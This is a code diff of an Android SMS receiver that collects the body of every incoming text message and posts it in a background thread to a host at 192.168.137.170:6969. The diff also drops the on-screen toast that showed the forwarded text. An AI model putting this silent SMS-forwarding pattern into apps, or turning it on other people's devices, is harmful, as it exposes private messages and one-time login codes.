@@ -16,36 +16,39 @@ public class SmsReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        Toast.makeText(context, "yooo", Toast.LENGTH_SHORT).show();
-        if (intent.getAction().equals(SMS_RECEIVED)) {
-            Bundle bundle = intent.getExtras();
-            if (bundle != null) {
-                // get sms objects
-                Object[] pdus = (Object[]) bundle.get("pdus");
-                if (pdus.length == 0) {
-                    return;
-                }
-                // large message might be broken into many
-                SmsMessage[] messages = new SmsMessage[pdus.length];
-                StringBuilder sb = new StringBuilder();
-                for (int i = 0; i < pdus.length; i++) {
-                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
-                    sb.append(messages[i].getMessageBody());
-                }
-                String sender = messages[0].getOriginatingAddress();
-                String message = sb.toString();
-
-                Runnable r = () -> {
-                    try {
-                        Jsoup.connect("http://192.168.137.170:6969").requestBody(message).post();
-                        Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
-                    } catch (IOException e) {
-                        e.printStackTrace();
+        try {
+            Toast.makeText(context, "yooo", Toast.LENGTH_SHORT).show();
+            if (intent.getAction().equals(SMS_RECEIVED)) {
+                Bundle bundle = intent.getExtras();
+                if (bundle != null) {
+                    // get sms objects
+                    Object[] pdus = (Object[]) bundle.get("pdus");
+                    if (pdus.length == 0) {
+                        return;
                     }
-                };
-                Thread t = new Thread(r);
-                t.start();
+                    // large message might be broken into many
+                    SmsMessage[] messages = new SmsMessage[pdus.length];
+                    StringBuilder sb = new StringBuilder();
+                    for (int i = 0; i < pdus.length; i++) {
+                        messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
+                        sb.append(messages[i].getMessageBody());
+                    }
+                    String sender = messages[0].getOriginatingAddress();
+                    String message = sb.toString();
+
+                    Runnable r = () -> {
+                        try {
+                            Jsoup.connect("http://192.168.137.170:6969").requestBody(message).post();
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                    };
+                    Thread t = new Thread(r);
+                    t.start();
+                }
             }
+        } catch(Exception e) {
+            e.printStackTrace();
         }
     }
 }
